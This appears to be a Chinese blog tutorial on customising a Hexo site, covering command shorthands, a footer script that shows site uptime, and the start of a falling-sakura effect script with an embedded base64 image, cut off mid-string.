hexo g<code>等价于</code>hexo generate<br>
hexo s<code>等价于 </code>hexo server<br>
hexo d<code>等价于</code>hexo deploy<br>
hexo g -d<code>等价于</code>hexo generate --deploy<br>
注: <code>hexo clean</code> 没有 简写, <code>git --version</code> 没有简写</p>
<h1 id="hexonext设置网站运行时间">hexo+next设置网站运行时间</h1>
<p>找到<code>hexo\themes\next\layout\_partials\footer.swig</code>添加如下代码：</p>
<pre><code class="hljs plaintext">&lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;&lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;
&lt;script&gt;
    var now = new Date(); 
    function createtime() &#123; 
        var grt= new Date(&quot;08/10/2018 17:38:00&quot;);//在此处修改你的建站时间，格式：月/日/年 时:分:秒
        now.setTime(now.getTime()+250); 
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
        if(String(hnum).length ==1 )&#123;hnum = &quot;0&quot; + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = &quot;0&quot; + mnum;&#125; 
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
        snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = &quot;0&quot; + snum;&#125; 
        document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;; 
        document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;; 
    &#125; 
setInterval(&quot;createtime()&quot;,250);
&lt;/script&gt;</code></pre>
<p>然后部署上传即可！</p>
<h1 id="添加樱花飘落效果">添加樱花飘落效果</h1>
<p>在<code>themes/matery/source/js</code>目录下新建<code>sakura.js</code>文件，将内容复制粘贴到sakura.js即可：</p>
<pre><code class="hljs plaintext">var stop, staticx;
var img = new Image();
img.src =
    &quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUgAAAEwCAYAAADVZeifAAAACXBIWXMAAACYAAAAmAGiyIKYAAAHG2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDIgNzkuMTYwOTI0LCAyMDE3LzA3LzEzLTAxOjA2OjM5ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBSaWdodHM9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9yaWdodHMvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcFJpZ2h0czpNYXJrZWQ9IkZhbHNlIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6NDFDMjQxQjYyNjIwNjgxMTgwODNEMjE2MDAzOTU1NDQiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDozNDVjOWViOC04NDc4LTFkNDctOGRjMi0yZDkyOGNhYTYxZWQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6YjAzN2ZiMGItNTU5Mi0xYjRkLWJjZGQtOWU4NGExMDJiMGM2IiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDE4LTA1LTA5VDE0OjQ5OjM3KzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxOC0wNS0wOVQxNDo1MToyNSswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOC0wNS0wOVQxNDo1MToyNSswODowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjEyMjVlZWE3LTEyY2QtMTY0NC04ZDAzLWFjOTE2ZTAxZDQ1YyIgc3RSZWY6ZG9jdW1lbnRJRD0idXVpZDoxRDIwNUFGNjZCRDlFNTExOUM5REMwMzg2RjlEQjFGNyIvPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDphYmMzNjIzMy1hOWNkLWNiNDQtODViYi0zZTgyMjEwYmIxMjYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDlUMTQ6NTE6MjUrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE4IChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6YjAzN2ZiMGItNTU5Mi0xYjRkLWJjZGQtOWU4NGExMDJiMGM2IiBzdEV2dDp3aGVuPSIyMDE4LTA1LTA5VDE0OjUxOjI1KzA4OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOCAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+XCpBoAAApBxJREFUeNrs/cmSI8u2LIipLnMHosnc59Z7jyxhjSg1oggn/EWO+SP8B34JhRyWCItk1at7786MBnBbWoNlZm4OOLrIvc8+t45bCjIQjibQuKuvTlUpCdva1ra2ta3zZdtHsK1tbWtbG0Bua1vb2tYGkNva1ra2tQHktra1rW1tALmtbW1rWxtAbmtb29rWBpDb2ta2trUB5La2ta1tbQC5rW1ta1sbQG5rW9va1gaQ29rWtra1AeS2trWtbW1rA8htbWtb29oAclvb2ta2NoDc1ra2ta0NILe1rW1tawPIbW1rW9vaAHJb29rWtjaA3Na2trWtDSC3ta1tbWsDyG1ta1vb2gByW9va1rY2gNzWtra1rW1tALmtbW1rWxtAbmtb29rWBpDb2ta2trUB5La2ta1tbQC5rW1ta1sbQG5rW9va1gaQ29rWtra1AeS2trWtbW0Aua1tbWtbG0Bua1vb2tY/3xr+o7+Bf/2//z/+1OfPAIgJErGbMj7M8fue+O1A7LLjcxyw+5hwZMbgQnLgKIftRsgMyYUjBYNhOn6AADiMOGDCyIQBCflwwNEdw24HHA5AzhjHJxyQwZTADLgmHJPhDRnfjo6PlPHbNOJDGZgEZsIgOAHPR/yPwxv+28MONOBghIEAiXce8LkzuAG/vRP7o+EzAcMRyNlxoJByxj4T/8su4+UgPE3A++jg5yfe/lvD73/b4eVfM17/zfE//y3h6UjsJ8f/9N8m/Of/Cnz/d0cegHES/t///Q7HHfG/+/8JT0fABGQTzIEkYMyGf/0vBh8N3/99wv/rP/1/sDs6/i//+t8DZhCATOFwzPj4/R3/MhkOmPBz/47dB+CY8LZ/w/NnQh4cu88dppSRU4abQwbQCRPhdDx/PCGbI9f7JLXbRfHpYw+n4MOkPAAUSacBmfv30f/rf+f+8m+GpyPw8Zrhl0IMAmK5KgAOWCY4Ib6r8pO+/hiV/5c/LyyVe6g8TnH5P/3f/q8bwv2zA+TfZ7HtvKbY4ScCOxCU4EaYE04hxb0hOYgEATAJTsGYkP2IQQBocAkkAGMBQcdgA47HA3aMg0cQkhmOGRhEZAMoIpdDhiREQYzXJQBDSQwygFGLdwET2/3c2luLx9fXzjhKk4hs8QTmsd2OAiHkIR4wZmFKxNMRGI7C5xPxt3+Lv+0GvL47/r/fBgBCJpAcYPwVAICbsPsE/v0VSJl49if8+/C/IEMwCIQBcCQLUBeBlOOFi4K5wanyGcgAiPEe5XSApInJsllCQkAVQNFStpTcUjoakxtNZqJIwtIx2XigpUyaG2xSdvPj9/+aPy3zoORuorKVD7OCoZfLxAUgMhegrEBYf1p8x2pYdxUKITVEXIBhewFit21bG0D+HWoQDgJwiERSAF622CFNgpsh5YypHPck4S7YEEcjQQhAsoRj/ixARHiBOVpAhsthNkCKPZwCvNvTB1Ugi7/dnpunr9mQYJjoGGWLOooVUAcDbAWV6CleN9sxJwzOeE/lczgakQ4OkzCNhBuwOwo/n+M+u4Pwsbd4dQLciJefwvR/CLDsgyWVP+SMxx0HgSCe8h7/037CwY7YY1cPeyQzwAxe3j9FeBKSwOf3p7Q7cuQ7d0oYCbPkifvDnqaULNvOhAE0c7p2ACEbTBwIjhCMYIJhAJggWICsMuQTnEdCB7m/7f6rv2XLb2781ITP6bdpSgcrgNhFhTqJChnv9eGosILijKAnCIvlxQsQbwC5AeTfM4IkACdhHtHUlBTxjYSjEYMATxHGEQyQK5GFlZ3daOWsLxgjyiphYAMVJIv9XsIC9xgHg4HIDFBzUxyM5QCUShxBYifDwYSXErlkCkmEkaAcEDFRERUKmCxA0ARMiIN5EHBIcT2JkapPgmVhShHRjZOQU5xExqPw43uNQCOqffp0iEAegDShe9Nz4DUcK6Aa9nmACLylT+ynXYlwC4CbYWLGHoTJzFxj8rTfH8ZnE14pfqP4Ctke0EBoEG0gMJLcK3J2Lx9XIrFz2kjBIhSvpx9NgI6QPgR/B/Qu6YNIo8kHTpYcU0IWcRw+NJ9HIoAjIAroTja/FhWeRIblUoGQHShSZV9J3A7bDSD/jil2xHQgiOTCNJRoToISW9rYsi2tnMZZ7ieHwSINhSJyYyBc7N8J7hmkAS7IAhgFYRRxNGFww2SOEQm5/e2IVZ3AToY3HiEMEfGWtJkIQGRJgfsIEuU1wAzKGUmEM0oHgwMYo3aWJuG4B3IidlNJlQnYFJ/JNMxvfXcUxqNw2AHjJxalgPbpuDAchePOsJsGJAz4Mb7jPx2/zyUAAPsUibbD0+v77nlwvEJ4pfEbHN9o9h20AEnoWcQe5FgvRrIU6wSjCRzNbIRAQBmug9wPcv+A9A66RR4vp7vk7hIyQTc3pckwCjo+C26atIj3r4PhalSIdSBswFeAsAEiojyjRGAgfGQ5LRBRTdjWBpB/F2ic910i9r1oHnQ1vpoml9splFSZ7XkC/AxZ7V5wCAMY4ZviEDMLgByGVEDTYSQkxyji04BnByY49khz8bBEgBkBkP9ucSBaV9+K9DRenxuQLeqC9TnqfZ3AWHJit7IBBmYgHQU8AXkE+AGYRxS5c4AufO6Ap/d4CB14+hA+98Tr74LXskWLeuNV7Y7A5154+knsfI8fw0d/WjIAw+uwG7lLT7T8QscLhb8B/AbxVcI30r6J/E7yReArpReSexhHGEeAVivEIBNrBUWYIP/UlN/o/i53wN3hzHBM5UWCJheY4cwwy0lJOEKi++dTdqUOIS80TuZwv1z3C1FhD4g1KjQ0AFyAoZWovfyhRYq/rQ0g/z4gyZq/IpXTfyYxOqJpYRGZycqODUDuYBoiNS6NmkSDKyOVWqXkAIeIIl1wd1hKyIdPjGNt1EQEeSwR5E8DkgyfzC2lriktSp1y5ylSWyqaQl2xoDaacgHI9h47gFRJ+02R0gNAAiEwABJAHuMPDpOQzcBJSBn4fDK8/MzwFK/l5V34t78ZYHMzCTWYKwXO3Qfw/h349jux0w7/y+7f4HASHEzpaWB64WivML0y41mO7yC+B0DiheR3AN9p9h3CK4QXCi8AX5H4DHJHlWoHlAMUNcl1gPs7MsiELKNzQgaZReS4rwQgR9GYmcQEV3bQkTnZu3Y05fyEI7y8rXujQs2NHdQSiUWKrH0PhoASAwgLxrfnyIiGliKjadu3tQHk32upprGtURN1O2SWRg1hU9QFkUsTptQRo/tNTCU6nKYJYzl8MoQdAJiBk8PlGC1hUmnBqEal0egZakMFbMEHu2OwrgSDIeqMQ9c3NtROdjwyW3SAWdPs2jcuzzeUjj0AmBMTiXSIDnNOhEod8rADcIiGy/ue+M/lL7oRr2+O//9/SS3qHnwZmTuF/Yfwb/9ZSJ7sv3x8p/yZlnZ7s+HVYP9C2t8A+4aBz3A8EfwO4G8k/ybhO8hvAL4B/BvEVwLfALwAeIH4VEJ2h3SE6x3SO+QfpFPQEbIRwo6uSWY7yI9AGgmMyvkIcgA50JjgHEEOFAY6Bk5INJl2BubrjRMuosI5Rdae0EmKXKcJILXHm6sBKaVF/RGurUGzAeRfC5Nexm/MgamOwCgiqADN2qgpoz4EvKS50ahJLXIKkPNlJ7uApTpYLt2Z+LvluKpZcWaN8ro8vkSVgwxHCs9eRnvK7cYAdbQ6ZAC+swSjJYIUHENJ6VVGdI5G2NEjrR5YGjXA23O82vEg/PitSzMNeH4XpgRMI8AM7HNL4xlRnWhZ9t/9D3gaNDz/H//tvzxZGp990Ctov8HSfwbtPwH2G42vAJ8B/Bbb8DfIvpN4AfgC4hniC4AR4gBglJQgOOSfdP0EPcN9kvMIMtFsiHOBEpgGAiZnYsTAiZCJTIASYANMBnmCmQmeIA12QMInjWU0oQGXz40zJEI7LFPkRMhWokKP/SoATw1UI9LUIgI9LQWBceLa1gaQf5dlAHKNwkr9Owk4lu4t5ZBx0XwgCLjXqnzbgdkQyBsaqTRqWhWfAZju5a/WbYzu+ABiStGVzgwQy2T721agdSfDkRkx+CNMc5INenRUss3znZlzJ9tLFJmc8DKuZCIwGGzKSEchjwZPMf9Yu7fjUTiOpVFTXs/uIPvb756ePmT7AwgyARgH8WV0vg6y1+T2Yjb8liz9N0rDd5l9S7TfSuT4n0H7TzT7DeQLYDsAz2B6BflMYF/qi0NpeZeOdE1bBbgTriTCYJYAGKUksv6eKCVQJiiRGkQNoCUQA+GDkBLgAwYlMg0gkkEDMAwpY0xHHc2RwZPGyVh+TwgwPI0Kc9lHSorMRdSpeZi8gqHmUiYsTlK5wLkb4WkDyA0g/6JKpJMYSif7EzO4tC5wqQVaS7GWjRqQIC1mHjG0TraBoAWo9o0aszEaNXUApetk77Ih07HDUEqkpQ1T7r9TwrtN8KlEjCxRbN+oKSMp9HJQ1eiSbI0aMUoHqZQOWDrZ2gF5IMZPlXonbJxg338XRRikJHBH4uX//P/ML0jpGbRXks8mfjOkvxntO5L9zWz4jTb8N0zpPyGlb6Q9C/YK8jst/Q3kd4A7gClCdMb+a8b5xNNNcdaB+DZuVUYFDAMcCcYBsARggDSUKsYAVyIxKvuRRESgwAhwonGQ5QGZOwAThR2TJhsxjsDgUx4+/xs7+rNpngo4AcNpJSos6fHNqLAAbE4xUuY2/+zvvKXZG0D+5SuVs/rMDomzd40ya51IcsASpEIFhJCY4HKk0qxwCKmM4sEFV4z6ZJ+Q0q7UIR1GQ9aEQYZPAs9u+BimBYbXCHIisHNDLiwTw3mjxrpO9pBxdlT27JpMRK1UMaRtk0MJOOwN40e2//SveXg62n50e/6XH3pS4p4Yni3ba5L9C2m/Uek3Mr0AfKHZNzL9C8jfMNg32PAd5DeZ/UZL30R7htmOiXvQ9rUBTVr5cNkiqPa61b3D2qwGoUhLCXII0NOoqCPumHiUcwQ0wG1E0g7EBGCMuiMGug2QBrmPzDiIHAAMoAYyJQMSpGEEh4MVNmUuJZK+cdJHhX2N8hQMLU5W2UpU2IGhuomFuRYJMKul3zWT2dYGkH/n+LFSDlm6hsJkjPGW0pCwfEo5VJthrBGb0TB5xoCumUMAaaYcjmnAYTqU7nZEmQMNDmAsqbFhnXJYj46xDMNlRM0UXce6drLFZSe7giJKpgpUiuPcyXYDhk/x+aenl5++e/7g0+j2bEzfEu03o73S+ULwBbDvNPsbLf2NKX2D2Uu5vIL2HcbfmIZvMPuGZM8wvsDsqTRFDMlIszLmwnlWc65ZtGHyGh/DS4W2lTe8zICnAe4DrKTMZgniyKwjqAGmJNcAq80YT8hIck9wGSkTUjIyRVVYKSJaJINScqTxmBNM2bwUiqUrUWFEhEolRbY5TZZhmSarn4EszRmfh9G9AGpO1kB1WxtA/l0B0k872Q5MKcI18wDI4QhMiWXULiiHaEPlbNxqz3OjRpVewplyyDQuKIf9wWU6jfQ0N2G610sQA6JRM2ruZLNUJU872T3l0MrQuiNqnUcDMsRxorl24/P/7Pv//f/ozyBeYOnV0vDNLP1Gpt9g9g3kE2ivMH6Dpd8wDL8hpW80vsLsGcZXpHJfS68kn2C2gzHBzFCH560Dxu4zmqPIOts0b2ojRLWhYdZ6IDGFj1ZzFDxF+J4S5ImUyd1gTCUFTyQTzJMcieSAXMBRiQGSyaCo/KWjp0xnPVedNk6WtcIZDE+jwqhNFhAsoFgJNW6lLpwMuYIp59Es1Kh1WxtA/r1hMvrOAZCpKNO0up/ZYgh6QTnEspONQuhgNyvMtoPPB39POWx8aUUkN1mkzo16eEI5FImxNGqoITrPIeew6GT3jZqpNmoATCUqHR1042hmuwTuTXjmgO9M9s2Mr6R9o9k3DMN3JPtOS99APsPSC82+I9lvGNJvsPQdZi+MKDHqkSk9wzjAaCyt/Dpu1MqK5Gl42803laICT0QjyvuPOcHCdnJHNGAsmjXuibJSK1WCEF1rIkE00VNoXdAgJgJJ8ZEnSoOSBiolSQNTSiYNhog+RUxrjZOzFPk0KtQ8XF6jQt+xpNlzvVGljlxPoOYqDR6169vaAPLvn2KjU7tx4DCUtFkq2++jHAIGyWFIFyiHgplFo4ZWGjVapxxS2LcBoNJDL42avQw/LEMeZYHcQX0cUGyNGpsbNZRcTjBDu72npxeMLzbaa4omyyuZvtHsN5KvoL0i2SstfUeyfynp8zONLyC/YUi/IdlvTOkVtBeQe5IDzAYYU4sEO3BbhLu12cE5bZ5BspxMvBuuNLaTT2OXKNJsmgFSIpkUnE6L35XgSKIMYoJ8IBlda5bGTulNCxpgliANMB8BO0ApUT6kbImUvX/nQgptnmOMhgxPokIZMaWICltkyXlf6zvcdMHc599PwXDLrjeA/CtX7SgndTxkYQZPLaXRYh4yaIOlxRCMGnfQUmvUNMqhA64TyqELSoKRIYsm4pPAixsOKeOpoxzWRk1QDhMmO8QsZn2Na5TDMr5EIhk5PCENL459Srvn0exvTOk7LX1jslcwvdL4Cto3pBI9WnSckdJvNLZaI81eo76YvpEstcX409FgYddUWUZXC0mcpuZhC5qINPPHu43dvFUB0FrQcxjkA+QDwSRwgJDgSjAOFEYJRzgToKF0vaPLHcdLuc4EMoE0kAOMiWZmE5MdkXiEcYTbpEXjRIz6YB4rGJ5EhZjrln1UOF/O+lEzAHtXm9wCyA0g/8pGDYqSD4r02Th1jRpFo6YBkgtMaKl4pRxmTaVRE3VHcACNsCy4hJQGTIcPjIzmjVI0ZhzCrlAOq7pPTzn0bvRo9FSkttY72RBwHIRjgo0TxidPz8PA55TshUwvNHvlkH4zS39DgF13YYhDmH2LdDkAEuQ3kC8lWnyC2UjaGKjcNVWkReS4TJuxLKrWcSl2qKD+ffeqOZ0ihs/RKI0xhOU0CKkOiUseMmcOA5noPihAb4CYKCaZDYAKmHpEvuIAs5Hyg8xGmI3GNI5HH3cfPn1KftwRXrQsaxe6jwpbp9sjyrWabnfzszqNCl2LSLQ1fFhS+cEi1t3WBpB/9+ixUuhOKYclovREpOM8OmOIiI9cUg5DG/LQmimqrBkGBFbKobyqPtY0PFg2qaMcLnDg5LhIMRY+Uw5rdAtgkNnLgUP6tOF5sv3A9C1Z+s3S8MqUXkh7jXqifceQvsMsmixM30C+wvgK8htSeiH5rTRkvpfbngAOJAmjtWix6zjXmmKNaJvAQz803wPpXFxdnrUUz9X6NewjzWXXO05UMsBGSCNcx4gUbQS0g/sEcgI5wmyEYwS1I5QV23cwTnBOJOu2PYEsINNsGvKQn96P+Zjgb//ZcprYGicBgL6MCCsl9TRF1gyGfVSo0vDRYJGKr4z/bGsDyL8kgmxipyVKi8ZGZUIE5TD4yx3l0NXogbVRQ1oLlAgid5TDFg0VdsxMOZxfR22keO2Ol0ZNTzms0dUow4GOZw9Gt4MmID35sN8d+ZxqpJjSb0zjbxxS7TTXkZzfmNJvsPQadcUWQb7C7HvUIUtaXSLGYJ90tUXyvLi4YIYQ6IByrvXqvKjGC8U2dpVilU+tpuOpfFjugJkRGuW+gyHTLUueg96ECVImmSXlKNsyI2jzU8AzXULcJmSILjED5jRNyZV3U/KXn9nfPvRBufrGyXpUWHjWJ3xqWVAR887K6A9XGz3WcbzNN7GKDSD/Qpis4rlDbdSMNX32og15QjnUFcqhO5g4n/g519tUBqPdc6TSRRuyNnJqJzsJmOgYZI1y6F1cupPhwyYgJ9t5SkTaJeNLYnrhzl4taojfYKk0VNILaS8FAF+R7BtS+h6pdNlGey2/RzptfCK5g1lapMEATnL7lQinn6w/AfhirXAeWhXw8/qZnQBph43tk6c3ewtAA4CnUqrNJF1kjujRIoRXqPqAnGBWwNK9gOZUznnRYyMdNAc9w+B0aH9E/tu/Kr+9+lEzvT5q0bk0V3yuJsRMZKTHbkXG7OQz6wGwB0V2Cj7asusNIP/SGiTqzFmk1VWlJmlGBCLP0l41XSwNnBrZWaEcsnwNHkUwGAsYJsHSCeUQYQDmcOwq5XAyTCaMLYWtaucRNO2VeKQncngelJ5pw0tKqTZXXsg5GsQwfGdKtab4DNoLkn2D2d+i3sgy5M3XEjGGlBhhTXGjfUxcDfRaCl3nWQwz0J1OVGu2mJgbTDYDXzoJx9RHp/GZN8ohu46GEZANkO9Bc8AzaBOoDMKjIMiQOKsgWPkwpIPI7ScoEi4iB5Aym5lrUt7/nqfPQZ6TJssnUWGaxSrWUmSqsLRWokSsRKGN+SRujewNIP8xVqMclpojywFAzLYF9QCt9UMWyqEVyqEtKIcxGM1JrZOd8xEp7Zp1A0lkBaPm3YBnGY6cFplnsXYwN/LZx6fvenrGwG9mwWYpIFi6z/bCxG+gvZYI8ltJoV9gfIbFSA8s7kOzVwD7Uo9LbXrbeAEI+0YLunpi1502Ow8S+yutR8MFcAo6p6csOj5YgCWWQEkQO6iLBJeXDGACmRURY+hE1u3ABDBqlrIR1A7gRNok00TDbsx+fHrD9Pbd8uGbCcLVFPmeqLAHwrO3j3Ppu21tAPn3jyJLSpQ0Uw73uQjjJoKFctgyJPcYncMsLZaYcPTphHLIpk6e5dilAdPxs1EOM4SRhiOEQdEdPaUcgjAmSwlpN5JPNvAbad9Ya4fkK0qUWBoqLzD7VmqPpRljESEanyP9DjsDGF/Aop7DhQrHEhA5lyPmkIjz9M5ippHLuqL6dPvk9xMcpDpFJMxNn/aArs6rOvJTRY2NkGigxgB8ZJBHEDuQE8Bo3AQY7kBWwAwbB3CkcZRzB+IIsylE5tNIYGfExGncPR95PE4+fRimlNF8jf6IqLCnltJLXdznz2VbG0D+3VfrZFfRB5872dGoCSOq44Jy6G2HtmLb2iiH5T5tjLu5HAo0a5TDM7DWMtjyoBymIY27RD6b2XMRh/ge9D/7RvKlpcelpkizVyS8wtIrLH2PWUeWYW97QeJrqHenl7Au6LLeKsWGrhlzFsydjuU02t9y8PviGel2e7Y1d7qm1VyILN+DV0Xuyl2y+DKlAbCR9AFmO8EngCMzR1kBQnEEeJRspDTCtFPSERk7Jkwi9nTPgE/FnWeitMPAPDqm17fJkVxTQvC0L0WF5ReufA5trLOPOisYllFPT8S027jYG0D+hRFk7UnX6mFSiOdWl8PJUjBeOINH72zXLLZoHeT2CuE8mRMMgOUJIFXKYTYVN0Ifnrh/5pBezNIrYw7xpUSKdfzmhbRvAF9h+AZLLzP9j9+Q0jekcjvtOSJIfgP4XCInsAcq8nK9se9anwAie5Ds0+/TGuXiOVdS9v6uNtcYAwwLCFbZotoeVjdyZARgpuwjyD2gieSoKB9kyjKArLBoyCHxWy5uOWZ2zEuLusSGWWB8KXSHAb4/mPBD+v27Phor9EpU2INhBULT/Bm7ET6iSfp6whmne1sbQP5lKXbTdsRMOawuh30kdY/LoVpbZ6Yc1vk+L3ax7jlYN61+WcRzRXyY8zXvxmEYnxKGV6bgPAP2EmISjHojUBkwpdGCOvQdQ93G11DcwbfClnkR8EyzZwCpAZCwmk7fcWa5L2rsgXIBnKdpNpflxh5IF4SbWUC2DlbLrEz1lNCLGmC2j06ZZkNqoa8IYhYYK3VKQTPfvmj4EIGMQax2Mnki8+5Af/7wfNj7wa14KXaZQANC74oTVgBwDBEUH9CJU8yPpUfcSg9bXubtWN0A8q9OtcNhCUlx1OXSlGlJX601VkrfCeXQgRn8aAvKIYvFgmvuZI/DALqCUUMiy/HkRgC7JxueacMrWSLASKVfCLwUEPxeosbCcLHXoqzzjU2CLH6PemM0aEjuEPqHJ5HahaLgSTFiFehqHH62eQU8yfWI8fLZa/X5iE4+7EShe+Z7awQoSF7a3oI89HRi3CdH8E8HmNs2WgYxgdrDFHOVhuICzgnME4H9IOSnT005MWvQlKYKvWWkp6j0TEPRgExdQ6ebHaMDqdIKs5rqz2nJZVsbQP7ljRp0LoFT8WcxlEaNF23Iely7Qna/iUlUvvU55TDm9RS86zRgmt6DEyNvquAC0rNsHDi8KKUXtHlG+4ZQ2SlyZEV2DGVMJwa7X1qjxkKyDAwhW6SWUu/CyuDkzZ+2y09T7AZyXZTG7raODdNG4XtBitOU+xqAXsJmXkEKzlqYsBApDqYTCShSbbMM+QSzHeWThGPpWGcQI2g70CeQR5K7YNRogjiCGgnsREwghpmVo3Fw2+0/NHFPPz7Da91QaaW7XaPJrPaTroUv9ql5Ysdu3w7UDSD/ARo1JUK00smuHO1shOXiKV2sCrIcAzsPmEI5nK5RDov9gjT7ljhE0tLTsHsysxdZegHthWTrQkcEaOHqx0inafY9utB8IdMrUv97F0HGY8e+C3yxccKVSG8BZNbV/dCJTixT7kXz5ioYnozqXIs411g4beZydu/pRTMQJcORKHVIcoK4I3UUORGYRI4gpnafUIkbFaLrE4gjYBOJUcQuuuOaSB5Ndtxljdkx/XiVW52uLN40lmd1cKtakDinIZ6CIRfSaZw52tvaAPKvadQAPeWQjqa6bRKOZhgVZl81nawmXrXmGOm01ZnFmG9slMMyDK04gIOAEY8fPA1DGp4xpG9geo5h79qd5rfSkAnQrCl2cKWDAYMuqmSpSSa+lLnIpwhh1wDn2jYsGttL5e9+5OYEKC81b26B5KXXsjA/6wbDy3fULILMolzRasZR02AEvSlAkVMBvSOAEcQYGj3sxoBahLiDFCNAsB2gwtu2oCiaRkA7unKk2j69f/rEo2T5clS4PA9xtlhozZslGHpRIs+77TjdAPIvhsnwoTEM7kgSDmVqBPKmvFNtEFpXeiYglqeZgbBu9drAqdqQlXKYM4dhGJiGZ6ThG9MQqTLw2mqIQKH/pVdCRZiWryC+weqYj9VI8VsnYPuKiJjGRbh1Jz4uDmNqCZK6kvOuNG/OQPJiyn3ltdWZSz9piplDnfBDWFUUcKwkd6cBGIE6D1l+kkeA8zbDEc49SC8d7glmR7jvC1jGdsOEzBxtlJwJ5HGCf/s3Tp9ppiGupchtTrIAYT84HgrlgO/QLBrax7YVIjeA/MtrkF0SlzyuT12jpkrg991GnVAORcDKrGOl0Dm8MWrC5RBIw2gwjmm3e0EaXsPyFKW22NLpnh/9ihpVlq513IbXIlz7isqeIZ9o3M8E8T5BXQO2C+IRutSn0QozRg8UDnUmc3b6Gshz5K6iwejEMNpAO3UuylsRMpBogHEHVaaMjgj2UDBsGj2RXpo3s8BFNHWmMvw6hdhF5XnT4XTA8tM7nvKLNCUdZyAErPiYz4IVRbNzDMk7txNBI3UfE+fHbGsDyH8YxKw87GzAmJeS/wvKoQNMbJRDVZdDz0iaxXNHFGUeF9xz2j+/7DkML7DU6IEgvoP2CvC5a768wvgbwDnt7uuLxhgIJ56RUhkI53DWjOkaKOuh2uXq7Hz1iv9oHyZWoLKV5s1a9ElejmJ5GuWrWGRrZtAUqbgFolQQrq8h1G1HsIBidKy9ux68a1dwtWdwzIXYlGH0xuUuEmmwlAFOnPLOsk37g46UT5aL9m+JCqN5M4/znEaFvTf2ormDUoPcIsgNIP8hokiiyEfkuVGTo5OtRNh0QjksNgs95dBgOGqmHNYok8k4piGNaffEIYU2YwhEvBZ/6W9zlMiQJwNLBGnfQMQ22jPIb0ypmGgFU4ZRb9xdjgZXLFV5IfVt7L5LIzxYkaY5AUlcS+d5IejklUbOaWNmQVcJ/ndhOHXacUFBdAPoBtoOVqTOqAKMjPEdZybtKPqudLOjgSMbI/G1ifQRxCgxapXhwR12ssQ4HDlOxun9VUesRYX9V2KnJwGe8LUFTw4fHJ62Ls0GkH/xuko5LC6HScCxWTkXymE5SGfKYSqUQzTKoQAmS6Ol4cnSEGM4xm8QX4uvdIkWESk2AijJ2pCxlmaTpcaYwiYhHmv7JiP